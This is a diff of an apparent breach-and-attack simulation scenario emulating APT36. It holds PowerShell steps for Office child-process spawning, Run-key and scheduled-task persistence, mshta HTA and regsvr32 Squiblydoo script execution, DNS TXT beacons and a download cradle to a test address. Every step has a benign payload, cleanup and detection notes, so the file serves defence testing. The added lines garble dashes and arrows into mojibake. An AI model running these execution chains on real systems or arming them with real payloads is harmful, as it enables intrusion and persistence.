@@ -1,24 +1,24 @@
-id: apt36-kill-chain
+﻿id: apt36-kill-chain
 name: APT36 Kill Chain (Three-Tier)
 description: >
-  Campaign-grade adversary emulation of APT36 (Transparent Tribe / PROJECTM) —
+  Campaign-grade adversary emulation of APT36 (Transparent Tribe / PROJECTM) â€”
   a Pakistani nexus threat actor with documented targeting of Indian BFSI,
   government, and defence organisations.
 
   TIERS:
   - Posture (default, safe anywhere): validates defences across prevention and
-    detection layers — macro controls, Protected View, MOTW, AMSI, Office child-
+    detection layers â€” macro controls, Protected View, MOTW, AMSI, Office child-
     process ASR, COM-abuse restrictions, ScriptBlock logging, Sysmon, persistence
     indicators, and browser credential exposure. Split into prevention-posture and
     detection-posture categories so the UI can distinguish "attack blocked" from
     "attack detectable".
   - Telemetry (opt-in, production-safe under approval): real, data/identity-safe
-    technique execution — authentic winword.exe→powershell.exe child chain, Run-key
+    technique execution â€” authentic winword.exeâ†’powershell.exe child chain, Run-key
     write+delete (EID 4657/Sysmon 13), localhost template-fetch (EID 4688), and
-    deterministic DNS beacon (bas-telemetry-<runid>.invalid → nslookup). Generates
+    deterministic DNS beacon (bas-telemetry-<runid>.invalid â†’ nslookup). Generates
     real EDR/SIEM/Sysmon telemetry; no credential access, no persistence, no real
     network egress.
-  - Lab (opt-in, isolated range only): full-fidelity APT36 tradecraft — mshta HTA
+  - Lab (opt-in, isolated range only): full-fidelity APT36 tradecraft â€” mshta HTA
     chain, scheduled-task persistence, DNS TXT beacon, BAS listener C2 simulation.
     Triggers EDR by design. Isolated range with snapshot only.
 
@@ -32,6 +32,7 @@ description: >
 author: Audspect Research
 executable: true
 local_check: true
+supported_os: [windows]
 tags:
   - apt36
   - transparent-tribe
@@ -61,7 +62,7 @@ live_policy:
 # Posture checks are handled by apt36KillChainChecks() in the agent (local_check path).
 # Lab steps (schtasks persistence, mshta chain, DNS TXT, C2 listener) are added in Portion 3.
 steps:
-  - name: "Office Child Process Chain (winword.exe → powershell.exe)"
+  - name: "Office Child Process Chain (winword.exe â†’ powershell.exe)"
     technique_id: T1566.001
     framework: custom
     executor: powershell
@@ -75,8 +76,8 @@ steps:
       - "Sysmon EID 1 (process create): Image=powershell.exe, ParentImage=%TEMP%\\winword.exe"
       - "Security EID 4688 (process create with command line) if process auditing enabled"
     detection:
-      - "EDR: Office process (winword.exe) spawning a shell — primary APT36 initial-access detection signal"
-      - "SIEM: parent-child rule winword.exe → powershell.exe / cmd.exe"
+      - "EDR: Office process (winword.exe) spawning a shell â€” primary APT36 initial-access detection signal"
+      - "SIEM: parent-child rule winword.exe â†’ powershell.exe / cmd.exe"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $tmp = Join-Path $env:TEMP 'winword.exe'
@@ -90,9 +91,9 @@ steps:
       if ($p) { $p.WaitForExit(10000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
       Remove-Item $tmp -Force -ErrorAction SilentlyContinue
       if ($ec -ge 0) {
-        Write-Output "EXEC: winword.exe->powershell.exe child-process chain fired (exit $ec) — expect Sysmon EID 1 with ParentImage=winword.exe. Benign payload only. [BAS-SIM]"
+        Write-Output "EXEC: winword.exe->powershell.exe child-process chain fired (exit $ec) â€” expect Sysmon EID 1 with ParentImage=winword.exe. Benign payload only. [BAS-SIM]"
       } else {
-        Write-Output "PASS: child process could not be started — AppLocker/WDAC/EDR blocked Office process spawning (good)."
+        Write-Output "PASS: child process could not be started â€” AppLocker/WDAC/EDR blocked Office process spawning (good)."
       }
     cleanup: |
       Remove-Item (Join-Path $env:TEMP 'winword.exe') -Force -ErrorAction SilentlyContinue
@@ -105,11 +106,11 @@ steps:
     fidelity: telemetry-safe
     production_safe: true
     risk: low
-    blast_radius: "Single HTTP GET to 127.0.0.1 only — no real network egress, no remote server contacted."
+    blast_radius: "Single HTTP GET to 127.0.0.1 only â€” no real network egress, no remote server contacted."
     reversible: true
     telemetry:
       - "Security EID 4688 (powershell.exe with Invoke-WebRequest command line)"
-      - "Network connection event: 127.0.0.1:80 — connection refused is expected and harmless"
+      - "Network connection event: 127.0.0.1:80 â€” connection refused is expected and harmless"
     detection:
       - "EDR: PowerShell making network connection shortly after Office child process spawn"
       - "SIEM: HTTP outbound correlated with T1566.001 step above"
@@ -118,9 +119,9 @@ steps:
       $uri = 'http://127.0.0.1/bas-template-probe'
       try {
         $r = Invoke-WebRequest -Uri $uri -TimeoutSec 2 -ErrorAction Stop
-        Write-Output "EXEC: template-fetch probe to $uri succeeded (status $($r.StatusCode)) — network telemetry generated. [BAS-SIM]"
+        Write-Output "EXEC: template-fetch probe to $uri succeeded (status $($r.StatusCode)) â€” network telemetry generated. [BAS-SIM]"
       } catch {
-        Write-Output "EXEC: template-fetch probe to $uri attempted (connection refused — expected, no listener running) — expect EID 4688 + network event. [BAS-SIM]"
+        Write-Output "EXEC: template-fetch probe to $uri attempted (connection refused â€” expected, no listener running) â€” expect EID 4688 + network event. [BAS-SIM]"
       }
     cleanup: ""
 
@@ -137,7 +138,7 @@ steps:
     telemetry:
       - "Security EID 4688 (PowerShell process with module-enumeration command line)"
     detection:
-      - "EDR: process enumerating its own loaded modules — visibility check; real hook install is lab-only"
+      - "EDR: process enumerating its own loaded modules â€” visibility check; real hook install is lab-only"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $proc   = [System.Diagnostics.Process]::GetCurrentProcess()
@@ -147,9 +148,9 @@ steps:
       $edrMods = @($loaded | Where-Object { $m = $_; ($edrPatterns | Where-Object { $m -match $_ }).Count -gt 0 })
       $edrStr  = if ($edrMods.Count -gt 0) { $edrMods -join ',' } else { 'none detected' }
       if ($user32) {
-        Write-Output "EXEC: user32.dll loaded — SetWindowsHookEx API reachable from this process. EDR/AMSI hook-monitoring modules: $edrStr. Real keyboard-hook install is lab-only. [BAS-SIM]"
+        Write-Output "EXEC: user32.dll loaded â€” SetWindowsHookEx API reachable from this process. EDR/AMSI hook-monitoring modules: $edrStr. Real keyboard-hook install is lab-only. [BAS-SIM]"
       } else {
-        Write-Output "PASS: user32.dll not in current process space — keyboard-hook API surface not directly reachable."
+        Write-Output "PASS: user32.dll not in current process space â€” keyboard-hook API surface not directly reachable."
       }
     cleanup: ""
 
@@ -167,14 +168,14 @@ steps:
       - "Security EID 4657 (registry value set) for HKCU\\...\\Run and RunOnce"
       - "Sysmon EID 13 (registry value set) with Image=powershell.exe, TargetObject=...\\Run\\BAS-SIM-APT36-Persist"
     detection:
-      - "SIEM: Run/RunOnce key modification by a non-installer process — APT36 persistence signal"
+      - "SIEM: Run/RunOnce key modification by a non-installer process â€” APT36 persistence signal"
       - "EDR: registry persistence write from powershell.exe with no corresponding installer activity"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $runKey     = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
       $runOnceKey = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
       $name = 'BAS-SIM-APT36-Persist'
-      $val  = 'BAS-SIM T1547.001 persistence probe — auto-removed'
+      $val  = 'BAS-SIM T1547.001 persistence probe â€” auto-removed'
       Set-ItemProperty -Path $runKey     -Name $name -Value $val -ErrorAction SilentlyContinue
       Set-ItemProperty -Path $runOnceKey -Name $name -Value $val -ErrorAction SilentlyContinue
       $runOk     = (Get-ItemProperty -Path $runKey     -Name $name -ErrorAction SilentlyContinue).$name -eq $val
@@ -182,9 +183,9 @@ steps:
       Remove-ItemProperty -Path $runKey     -Name $name -ErrorAction SilentlyContinue
       Remove-ItemProperty -Path $runOnceKey -Name $name -ErrorAction SilentlyContinue
       if ($runOk -or $runOnceOk) {
-        Write-Output "EXEC: Run=$runOk RunOnce=$runOnceOk — registry persistence probe written and deleted. Expect Sysmon EID 13 + Security EID 4657. No entry remains. [BAS-SIM]"
+        Write-Output "EXEC: Run=$runOk RunOnce=$runOnceOk â€” registry persistence probe written and deleted. Expect Sysmon EID 13 + Security EID 4657. No entry remains. [BAS-SIM]"
       } else {
-        Write-Output "PASS: could not write to HKCU Run/RunOnce keys — registry write blocked (restricted token / AppLocker / policy)."
+        Write-Output "PASS: could not write to HKCU Run/RunOnce keys â€” registry write blocked (restricted token / AppLocker / policy)."
       }
     cleanup: |
       Remove-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'     -Name 'BAS-SIM-APT36-Persist' -ErrorAction SilentlyContinue
@@ -198,26 +199,26 @@ steps:
     fidelity: telemetry-safe
     production_safe: true
     risk: low
-    blast_radius: "nslookup to a .invalid RFC 2606 reserved domain — guaranteed non-routable; DNS query goes to corporate resolver only, never to the internet."
+    blast_radius: "nslookup to a .invalid RFC 2606 reserved domain â€” guaranteed non-routable; DNS query goes to corporate resolver only, never to the internet."
     reversible: true
     telemetry:
       - "Sysmon EID 22 (DNS query event) for bas-telemetry-<id>.invalid"
       - "Security EID 4688 (nslookup.exe with beacon domain as argument)"
       - "Corporate DNS server log: NXDOMAIN for bas-telemetry-*.invalid"
     detection:
-      - "SIEM: DNS query for .invalid TLD from endpoint — deterministic BAS beacon; correlate run ID across all events in this run"
+      - "SIEM: DNS query for .invalid TLD from endpoint â€” deterministic BAS beacon; correlate run ID across all events in this run"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $runId  = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0, [Math]::Min(8, $env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
       $beacon = "bas-telemetry-$runId.invalid"
       nslookup $beacon 2>&1 | Out-Null
-      Write-Output "EXEC: DNS beacon '$beacon' queried — expect Sysmon EID 22 + nslookup EID 4688. NXDOMAIN response expected. Use run-id '$runId' for SIEM correlation across this scenario run. [BAS-SIM]"
+      Write-Output "EXEC: DNS beacon '$beacon' queried â€” expect Sysmon EID 22 + nslookup EID 4688. NXDOMAIN response expected. Use run-id '$runId' for SIEM correlation across this scenario run. [BAS-SIM]"
     cleanup: ""
 
-  # ── Lab-only steps ─────────────────────────────────────────────────────────
-  # fidelity: lab-only  →  skipped in telemetry mode; requires confirmLab + isolated range
+  # â”€â”€ Lab-only steps â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+  # fidelity: lab-only  â†’  skipped in telemetry mode; requires confirmLab + isolated range
 
-  - name: "Scheduled Task Persistence (lab — create + delete)"
+  - name: "Scheduled Task Persistence (lab â€” create + delete)"
     technique_id: T1053.005
     framework: custom
     executor: powershell
@@ -233,7 +234,7 @@ steps:
       - "Sysmon EID 1 (schtasks.exe process create)"
     detection:
       - "SIEM: schtask creation from a non-installer process; APT36 names tasks to mimic system tasks"
-      - "EDR: Register-ScheduledTask via powershell.exe — no MSI or update context"
+      - "EDR: Register-ScheduledTask via powershell.exe â€” no MSI or update context"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $taskName = 'BAS-SIM-APT36-WindowsUpdate'
@@ -244,14 +245,14 @@ steps:
       if ($created) {
         Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
         $gone = -not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)
-        Write-Output "FAIL: scheduled task '$taskName' created and removed (cleanup verified=$gone) — expect EID 4698+4699. APT36-style schtask persistence not blocked. [BAS-SIM]"
+        Write-Output "FAIL: scheduled task '$taskName' created and removed (cleanup verified=$gone) â€” expect EID 4698+4699. APT36-style schtask persistence not blocked. [BAS-SIM]"
       } else {
-        Write-Output "PASS: scheduled task creation blocked — AppLocker / restricted token / policy prevented APT36 persistence mechanism."
+        Write-Output "PASS: scheduled task creation blocked â€” AppLocker / restricted token / policy prevented APT36 persistence mechanism."
       }
     cleanup: |
       Unregister-ScheduledTask -TaskName 'BAS-SIM-APT36-WindowsUpdate' -Confirm:$false -ErrorAction SilentlyContinue
 
-  - name: "mshta HTA Dropper Chain (lab — VBScript + cmd.exe spawn)"
+  - name: "mshta HTA Dropper Chain (lab â€” VBScript + cmd.exe spawn)"
     technique_id: T1218.005
     framework: custom
     executor: powershell
@@ -259,7 +260,7 @@ steps:
     fidelity: lab-only
     production_safe: false
     risk: high
-    blast_radius: "Writes a benign .hta to %TEMP%, executes via mshta.exe — spawns cmd.exe /c echo as a child (no payload). File deleted on completion. Triggers EDR by design."
+    blast_radius: "Writes a benign .hta to %TEMP%, executes via mshta.exe â€” spawns cmd.exe /c echo as a child (no payload). File deleted on completion. Triggers EDR by design."
     reversible: true
     telemetry:
       - "Sysmon EID 11 (file create): bas_sim_apt36.hta in %TEMP%"
@@ -267,27 +268,27 @@ steps:
       - "Sysmon EID 1 (process create): cmd.exe with ParentImage=mshta.exe"
       - "Security EID 4688 for both mshta.exe and cmd.exe"
     detection:
-      - "EDR: mshta.exe spawning cmd.exe — canonical APT36 HTA dropper detection signal"
-      - "SIEM: mshta.exe executing a file from %TEMP% — high-fidelity APT36 initial-access indicator"
+      - "EDR: mshta.exe spawning cmd.exe â€” canonical APT36 HTA dropper detection signal"
+      - "SIEM: mshta.exe executing a file from %TEMP% â€” high-fidelity APT36 initial-access indicator"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $hta = Join-Path $env:TEMP 'bas_sim_apt36.hta'
       $htaContent = '<html><head></head><body onload="vbscript:CreateObject(''WScript.Shell'').Run ''cmd.exe /c echo BAS-SIM-T1218.005'',0,True:window.close"></body></html>'
       [System.IO.File]::WriteAllText($hta, $htaContent, [System.Text.Encoding]::UTF8)
-      if (-not (Test-Path $hta)) { Write-Output "PASS: HTA file write blocked — execution surface restricted."; return }
+      if (-not (Test-Path $hta)) { Write-Output "PASS: HTA file write blocked â€” execution surface restricted."; return }
       $p = Start-Process 'mshta.exe' -ArgumentList "`"$hta`"" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
       if ($p) { $p.WaitForExit(10000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
       Remove-Item $hta -Force -ErrorAction SilentlyContinue
       $cleaned = -not (Test-Path $hta)
       if ($ec -ge 0) {
-        Write-Output "FAIL: mshta.exe HTA chain executed (exit $ec, artifact cleaned=$cleaned) — APT36 HTA dropper vector not blocked. Expect Sysmon EID 1 mshta->cmd. [BAS-SIM]"
+        Write-Output "FAIL: mshta.exe HTA chain executed (exit $ec, artifact cleaned=$cleaned) â€” APT36 HTA dropper vector not blocked. Expect Sysmon EID 1 mshta->cmd. [BAS-SIM]"
       } else {
-        Write-Output "PASS: mshta.exe execution blocked — AppLocker / ASR rule / WDAC prevented HTA dropper execution (artifact cleaned=$cleaned)."
+        Write-Output "PASS: mshta.exe execution blocked â€” AppLocker / ASR rule / WDAC prevented HTA dropper execution (artifact cleaned=$cleaned)."
       }
     cleanup: |
       Remove-Item (Join-Path $env:TEMP 'bas_sim_apt36.hta') -Force -ErrorAction SilentlyContinue
 
-  - name: "regsvr32 Squiblydoo SCT Chain (lab — JScript + cmd.exe spawn)"
+  - name: "regsvr32 Squiblydoo SCT Chain (lab â€” JScript + cmd.exe spawn)"
     technique_id: T1218.010
     framework: custom
     executor: powershell
@@ -295,7 +296,7 @@ steps:
     fidelity: lab-only
     production_safe: false
     risk: high
-    blast_radius: "Writes a benign .sct scriptlet to %TEMP%, executes via regsvr32 /i scrobj.dll — spawns cmd.exe /c echo as child. File deleted on completion. Triggers EDR by design."
+    blast_radius: "Writes a benign .sct scriptlet to %TEMP%, executes via regsvr32 /i scrobj.dll â€” spawns cmd.exe /c echo as child. File deleted on completion. Triggers EDR by design."
     reversible: true
     telemetry:
       - "Sysmon EID 11 (file create): bas_sim_apt36.sct in %TEMP%"
@@ -303,27 +304,27 @@ steps:
       - "Sysmon EID 1 (process create): regsvr32.exe with /i:path scrobj.dll"
       - "Sysmon EID 1 (process create): cmd.exe with ParentImage=regsvr32.exe"
     detection:
-      - "EDR: regsvr32.exe loading scrobj.dll and spawning cmd.exe — Squiblydoo detection signature"
+      - "EDR: regsvr32.exe loading scrobj.dll and spawning cmd.exe â€” Squiblydoo detection signature"
       - "SIEM: regsvr32.exe with /i: argument referencing a %TEMP% file"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $sct = Join-Path $env:TEMP 'bas_sim_apt36.sct'
       $sctContent = '<?XML version="1.0"?><scriptlet><registration progid="BAS" classid="{11111111-1111-1111-1111-111111111111}"><script language="JScript"><![CDATA[new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo BAS-SIM-T1218.010",0,true);]]></script></registration></scriptlet>'
       [System.IO.File]::WriteAllText($sct, $sctContent, [System.Text.Encoding]::UTF8)
-      if (-not (Test-Path $sct)) { Write-Output "PASS: SCT file write blocked — execution surface restricted."; return }
+      if (-not (Test-Path $sct)) { Write-Output "PASS: SCT file write blocked â€” execution surface restricted."; return }
       $p = Start-Process 'regsvr32.exe' -ArgumentList "/s /n /u /i:`"$sct`" scrobj.dll" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
       if ($p) { $p.WaitForExit(10000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
       Remove-Item $sct -Force -ErrorAction SilentlyContinue
       $cleaned = -not (Test-Path $sct)
       if ($ec -ge 0) {
-        Write-Output "FAIL: regsvr32 Squiblydoo executed (exit $ec, artifact cleaned=$cleaned) — scrobj.dll chain not blocked. Expect Sysmon EID 7 scrobj.dll + EID 1 cmd.exe. [BAS-SIM]"
+        Write-Output "FAIL: regsvr32 Squiblydoo executed (exit $ec, artifact cleaned=$cleaned) â€” scrobj.dll chain not blocked. Expect Sysmon EID 7 scrobj.dll + EID 1 cmd.exe. [BAS-SIM]"
       } else {
-        Write-Output "PASS: regsvr32 execution blocked — AppLocker / WDAC / ASR rule prevented Squiblydoo SCT chain (artifact cleaned=$cleaned)."
+        Write-Output "PASS: regsvr32 execution blocked â€” AppLocker / WDAC / ASR rule prevented Squiblydoo SCT chain (artifact cleaned=$cleaned)."
       }
     cleanup: |
       Remove-Item (Join-Path $env:TEMP 'bas_sim_apt36.sct') -Force -ErrorAction SilentlyContinue
 
-  - name: "C2 DNS TXT Beacon (lab — CrimsonRAT channel registration)"
+  - name: "C2 DNS TXT Beacon (lab â€” CrimsonRAT channel registration)"
     technique_id: T1071.004
     framework: custom
     executor: powershell
@@ -331,23 +332,23 @@ steps:
     fidelity: lab-only
     production_safe: false
     risk: low
-    blast_radius: "DNS TXT query to bas-c2-<runid>.invalid — .invalid is RFC 2606 reserved, guaranteed NXDOMAIN. No real C2 contacted."
+    blast_radius: "DNS TXT query to bas-c2-<runid>.invalid â€” .invalid is RFC 2606 reserved, guaranteed NXDOMAIN. No real C2 contacted."
     reversible: true
     telemetry:
       - "Sysmon EID 22 (DNS query): TXT record query for bas-c2-<id>.invalid"
       - "Corporate DNS server log: NXDOMAIN for bas-c2-*.invalid"
     detection:
-      - "SIEM: DNS TXT query from endpoint — CrimsonRAT uses TXT records for C2 channel registration; correlate with run ID"
+      - "SIEM: DNS TXT query from endpoint â€” CrimsonRAT uses TXT records for C2 channel registration; correlate with run ID"
       - "NDR: unusual DNS TXT query volume from workstation to external resolver"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $runId  = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0, [Math]::Min(8, $env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
       $beacon = "bas-c2-$runId.invalid"
       Resolve-DnsName -Name $beacon -Type TXT -ErrorAction SilentlyContinue | Out-Null
-      Write-Output "EXEC: DNS TXT beacon '$beacon' queried — expect Sysmon EID 22 (TXT type). NXDOMAIN is expected. CrimsonRAT uses TXT records for C2 registration — use '$runId' to correlate across this run. [BAS-SIM]"
+      Write-Output "EXEC: DNS TXT beacon '$beacon' queried â€” expect Sysmon EID 22 (TXT type). NXDOMAIN is expected. CrimsonRAT uses TXT records for C2 registration â€” use '$runId' to correlate across this run. [BAS-SIM]"
     cleanup: ""
 
-  - name: "Download Cradle (lab — BAS listener / RFC5737 isolated)"
+  - name: "Download Cradle (lab â€” BAS listener / RFC5737 isolated)"
     technique_id: T1105
     framework: custom
     executor: powershell
@@ -355,13 +356,13 @@ steps:
     fidelity: lab-only
     production_safe: false
     risk: medium
-    blast_radius: "Invoke-WebRequest to BAS_C2_URI env var, or RFC5737 TEST-NET-1 (192.0.2.1) if unset — no real internet egress. Connection timeout is expected without a BAS listener."
+    blast_radius: "Invoke-WebRequest to BAS_C2_URI env var, or RFC5737 TEST-NET-1 (192.0.2.1) if unset â€” no real internet egress. Connection timeout is expected without a BAS listener."
     reversible: true
     telemetry:
       - "Sysmon EID 3 (network connection): powershell.exe to configured BAS listener or 192.0.2.1"
       - "Security EID 4688 (powershell.exe with Invoke-WebRequest command line)"
     detection:
-      - "EDR: PowerShell download cradle shortly after LOLBin execution — APT36 RAT delivery follow-on"
+      - "EDR: PowerShell download cradle shortly after LOLBin execution â€” APT36 RAT delivery follow-on"
       - "SIEM: outbound HTTP from powershell.exe; correlate source IP + run ID"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
@@ -369,8 +370,8 @@ steps:
       try {
         $r    = Invoke-WebRequest -Uri $uri -TimeoutSec 3 -ErrorAction Stop
         $size = $r.Content.Length
-        Write-Output "EXEC: download cradle to '$uri' returned $size bytes — BAS listener responded. Expect Sysmon EID 3 network event. Set BAS_C2_URI to isolated BAS listener for full fidelity. [BAS-SIM]"
+        Write-Output "EXEC: download cradle to '$uri' returned $size bytes â€” BAS listener responded. Expect Sysmon EID 3 network event. Set BAS_C2_URI to isolated BAS listener for full fidelity. [BAS-SIM]"
       } catch {
-        Write-Output "EXEC: download cradle to '$uri' attempted (timeout/refused — expected without listener) — expect Sysmon EID 3 outbound attempt. Set BAS_C2_URI=http://<isolated-listener>/path for full simulation. [BAS-SIM]"
+        Write-Output "EXEC: download cradle to '$uri' attempted (timeout/refused â€” expected without listener) â€” expect Sysmon EID 3 outbound attempt. Set BAS_C2_URI=http://<isolated-listener>/path for full simulation. [BAS-SIM]"
       }
     cleanup: ""
